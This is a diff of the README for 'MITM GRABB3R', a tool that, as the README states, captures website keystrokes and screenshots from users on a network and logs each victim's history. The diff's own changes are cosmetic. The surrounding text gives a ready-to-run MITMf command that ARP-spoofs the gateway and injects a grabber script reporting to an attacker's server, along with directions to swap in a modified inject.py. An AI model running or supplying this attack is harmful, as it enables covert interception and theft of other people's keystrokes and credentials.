@@ -8,7 +8,7 @@ This script can capture keystrokes of user input on websites, capture screenshot
 
 Each clients history and captures can be viewed on a timeline.
 
-!["MITM GRABB3R DEMO"] (http://i.share.pho.to/797b0a0d_o.png "MITM GRABB3R DEMO")
+!["MITM GRABB3R DEMO"](http://i.share.pho.to/797b0a0d_o.png "MITM GRABB3R DEMO")
 
 HOW TO SET SCRIPT
 ===
@@ -33,7 +33,7 @@ HOW TO: MITMf
 Replace inject.py in plugins folder ( MITMf 0.9.8 ) with inject.py that contains small changes.
 
 
-Example:
+Example cmd:
 
 	python mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --inject --grabber-url http://192.168.1.5/mitm/inject.php
 
